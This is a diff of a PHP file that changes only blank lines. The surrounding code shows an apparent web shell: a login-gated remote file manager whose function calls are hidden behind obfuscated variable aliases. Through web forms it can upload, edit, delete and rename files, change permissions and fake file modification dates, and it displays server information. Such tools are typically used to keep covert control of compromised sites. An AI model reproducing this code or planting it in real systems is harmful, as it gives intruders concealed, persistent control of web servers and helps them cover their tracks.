@@ -59,7 +59,6 @@ if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
 function perms($file){ global $af; $perm = $af($file); return substr(sprintf('%o', $perm), -4); }
 function owner($file){ if(function_exists('posix_getpwuid')){ $uid = fileowner($file); $info = posix_getpwuid($uid); return $info['name']; } return 'unknown'; }
 function filedate($file){ global $z,$ab; return $ab("Y-m-d H:i:s", $z($file)); }
-
 function deleteDirectory($dir) {
     global $o, $p, $s, $x, $r;
     if(!$o($dir)) return true;
@@ -144,7 +143,6 @@ if(isset($_FILES['file']) && $_FILES['file']['error'] == 0){
         $msg_type = "error";
     }
 }
-
 if(isset($_POST['newfile']) && !empty($_POST['newfile'])){
     $newfile = $_POST['newfile'];
     $fullpath = $path.'/'.$newfile;
@@ -157,7 +155,6 @@ if(isset($_POST['newfile']) && !empty($_POST['newfile'])){
         $msg_type = "error";
     }
 }
-
 if(isset($_POST['newfolder']) && !empty($_POST['newfolder'])){
     $newfolder = $_POST['newfolder'];
     $fullpath = $path.'/'.$newfolder;
@@ -170,7 +167,6 @@ if(isset($_POST['newfolder']) && !empty($_POST['newfolder'])){
         $msg_type = "error";
     }
 }
-
 if(isset($_POST['delete']) && isset($_POST['target'])){
     $target = $_POST['target'];
     $name = $d($target);
@@ -182,7 +178,6 @@ if(isset($_POST['delete']) && isset($_POST['target'])){
         $msg_type = "error";
     }
 }
-
 if(isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])){
     $oldname = $_POST['oldname'];
     $newname = dirname($oldname) . '/' . $_POST['newname'];
@@ -196,7 +191,6 @@ if(isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'
         $msg_type = "error";
     }
 }
-
 if(isset($_POST['chmod']) && isset($_POST['target']) && isset($_POST['perm'])){
     $target = $_POST['target'];
     $perm = $_POST['perm'];
@@ -209,7 +203,6 @@ if(isset($_POST['chmod']) && isset($_POST['target']) && isset($_POST['perm'])){
         $msg_type = "error";
     }
 }
-
 if(isset($_POST['savefile']) && isset($_POST['target']) && isset($_POST['src'])){
     $target = $_POST['target'];
     $name = $d($target);
@@ -221,7 +214,6 @@ if(isset($_POST['savefile']) && isset($_POST['target']) && isset($_POST['src']))
         $msg_type = "error";
     }
 }
-
 if(isset($_POST['chdate']) && isset($_POST['target']) && isset($_POST['new_date'])){
     $target = $_POST['target'];
     $name = $d($target);
@@ -300,7 +292,6 @@ function goHome(){ window.location.href = window.location.pathname; }
 </head>
 <body>
 <h1 onclick="goHome()"><?=$APP_NAME?></h1>
-
 <div style="margin:10px;padding:10px;border:1px solid #7d3c98;border-radius:6px;">
     <b>Server Info</b><br>
     PHP: <?=$h();?><br>
@@ -312,7 +303,6 @@ function goHome(){ window.location.href = window.location.pathname; }
         <a href="?logout=1" class="logout-btn"><i class="fa fa-sign-out"></i> Logout</a>
     </div>
 </div>
-
 <div class="breadcrumb">
 <?php 
 $bread_path = "";
@@ -329,7 +319,6 @@ foreach($paths as $id => $pat){
 } 
 ?>
 </div>
-
 <div style="margin:10px;padding:5px;border:1px solid #7d3c98;border-radius:6px;">
     <form enctype="multipart/form-data" method="POST" style="display:inline-block;">Upload: <input type="file" name="file"><input type="submit" value="Go"></form>
     <form method="POST" style="display:inline-block;margin-left:10px;">New File: <input type="text" name="newfile" size="8"><input type="submit" value="Create"></form>
@@ -338,7 +327,6 @@ foreach($paths as $id => $pat){
     <div class="msg-box <?=$msg_type?>"><i class="fa <?=$msg_type=='success'?'fa-check-circle':'fa-exclamation-circle'?>"></i> <?=$msg?></div>
     <?php endif; ?>
 </div>
-
 <div style="margin:10px;">
     <form method="GET">
         <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
@@ -346,7 +334,6 @@ foreach($paths as $id => $pat){
         <input type="submit" value="Find">
     </form>
 </div>
-
 <div class="table-container">
 <table>
 <thead>
@@ -362,11 +349,9 @@ foreach($paths as $id => $pat){
 <tbody>
 <?php
 $items = @$x($path);
-
 if($items && is_array($items)) {
     $folders = array();
     $files = array();
-    
     foreach($items as $item) {
         if($item == '.' || $item == '..') continue;
         if($search && stripos($item, $search) === false) continue;
@@ -377,10 +362,8 @@ if($items && is_array($items)) {
             $files[] = $item;
         }
     }
-    
     sort($folders);
     sort($files);
-    
     foreach($folders as $folder) {
         $fullpath = $path . '/' . $folder;
         $perm = perms($fullpath);
@@ -398,7 +381,6 @@ if($items && is_array($items)) {
         } else {
             $perm_color = '#ffffff';
         }
-        
         echo '<tr>';
         echo '<td><i class="fa fa-folder" style="color: #ffe9a2"></i> <a href="?path=' . htmlspecialchars($fullpath) . '">' . htmlspecialchars($folder) . '</a></td>';
         echo '<td style="text-align:center">--</td>';
@@ -415,7 +397,6 @@ if($items && is_array($items)) {
             </form>
           </td>
         </td>';
-        
         echo '<div id="' . $renameId . '" class="modal modal-small">
             <span class="close" onclick="closeModal(\'' . $renameId . '\')">&times;</span>
             <h3>Rename: ' . htmlspecialchars($folder) . '</h3>
@@ -425,7 +406,6 @@ if($items && is_array($items)) {
                 <button type="submit" name="rename">Rename</button>
             </form>
         </div>';
-        
         echo '<div id="' . $chdateId . '" class="modal modal-small">
             <span class="close" onclick="closeModal(\'' . $chdateId . '\')">&times;</span>
             <h3>Change Date: ' . htmlspecialchars($folder) . '</h3>
@@ -435,7 +415,6 @@ if($items && is_array($items)) {
                 <button type="submit" name="chdate">Apply</button>
             </form>
         </div>';
-        
         echo '<div id="' . $chmodId . '" class="modal modal-small">
             <span class="close" onclick="closeModal(\'' . $chmodId . '\')">&times;</span>
             <h3>Chmod: ' . htmlspecialchars($folder) . '</h3>
@@ -446,7 +425,6 @@ if($items && is_array($items)) {
             </form>
         </div>';
     }
-    
     foreach($files as $file) {
         $fullpath = $path . '/' . $file;
         $size = $y($fullpath);
@@ -457,11 +435,9 @@ if($items && is_array($items)) {
         } else {
             $size_display = $size.' B';
         }
-        
         $perm = perms($fullpath);
         $date = filedate($fullpath);
         $owner_name = owner($fullpath);
-        
         $editId = 'editFile_' . md5($fullpath);
         $renameId = 'renameFile_' . md5($fullpath);
         $chmodId = 'chmodFile_' . md5($fullpath);
@@ -493,7 +469,6 @@ if($items && is_array($items)) {
             </form>
           </td>
         </td>';
-        
         echo '<div class="modal modal-editor" id="' . $editId . '">
             <span class="close" onclick="closeModal(\'' . $editId . '\')">&times;</span>
             <h3>Edit File: ' . htmlspecialchars($file) . '</h3>
@@ -503,7 +478,6 @@ if($items && is_array($items)) {
                 <button type="submit" name="savefile">Save</button>
             </form>
         </div>';
-        
         echo '<div id="' . $renameId . '" class="modal modal-small">
             <span class="close" onclick="closeModal(\'' . $renameId . '\')">&times;</span>
             <h3>Rename: ' . htmlspecialchars($file) . '</h3>
@@ -513,7 +487,6 @@ if($items && is_array($items)) {
                 <button type="submit" name="rename">Rename</button>
             </form>
         </div>';
-        
         echo '<div id="' . $chdateId . '" class="modal modal-small">
             <span class="close" onclick="closeModal(\'' . $chdateId . '\')">&times;</span>
             <h3>Change Date: ' . htmlspecialchars($file) . '</h3>
@@ -523,7 +496,6 @@ if($items && is_array($items)) {
                 <button type="submit" name="chdate">Apply</button>
             </form>
         </div>';
-        
         echo '<div id="' . $chmodId . '" class="modal modal-small">
             <span class="close" onclick="closeModal(\'' . $chmodId . '\')">&times;</span>
             <h3>Chmod: ' . htmlspecialchars($file) . '</h3>
